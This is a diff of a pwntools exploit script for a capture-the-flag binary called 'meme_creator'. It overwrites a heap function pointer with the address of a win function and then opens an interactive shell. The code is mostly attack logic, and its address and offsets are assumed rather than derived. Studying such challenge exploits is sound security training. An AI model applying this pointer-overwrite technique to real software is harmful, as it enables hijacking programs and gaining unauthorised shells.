@@ -1,36 +1,29 @@
 from pwn import *
+# Set up the binary and context
+context.binary = './meme_creator'
+binary = context.binary
 
-# Adjust these values based on the actual environment
-binary_path = './meme_creator'
-remote_host = 'challenge.example.com'
-remote_port = 1337
-# Start the process or connect to the remote server
-if args.REMOTE:
-    p = remote(remote_host, remote_port)
-else:
-    p = process(binary_path)
+# Start the process
+p = process(binary.path)
 
-# Find the offset for the function pointer in the meme structure
-meme_size = 0x20  # Size of the meme content
-func_ptr_offset = 0x10  # Offset of the function pointer in the meme structure
-
-# Address of the EZ_WIN function
-EZ_WIN_addr = 0x4014A0  # Replace with the actual address
-
-# Create a new meme
+# Step 1: Create a new meme to allocate memory
 p.sendlineafter('Choice: ', '1')
-p.sendlineafter('Enter meme size: ', str(meme_size))
-p.sendlineafter('Enter meme content: ', 'A' * meme_size)
+p.sendlineafter('Enter meme size: ', '32')
+p.sendlineafter('Enter meme content: ', 'A' * 31)
 
-# Edit the meme to overwrite the function pointer
+# Step 2: Edit the meme to overwrite the function pointer
 p.sendlineafter('Choice: ', '2')
 p.sendlineafter('Index: ', '0')
-p.sendlineafter('Enter meme content: ', p64(EZ_WIN_addr) + 'A' * (meme_size - func_ptr_offset))
 
-# Trigger the function pointer
+# Overwrite the function pointer with the address of EZ_WIN
+# Assuming the address of EZ_WIN is known (e.g., from binary analysis)
+ez_win_address = 0x4014A0
+payload = p64(ez_win_address)
+p.sendline(payload)
+
+# Step 3: Trigger the EZ_WIN function by printing the meme
 p.sendlineafter('Choice: ', '3')
 p.sendlineafter('Index: ', '0')
 
 # Interact with the shell
 p.interactive()
-
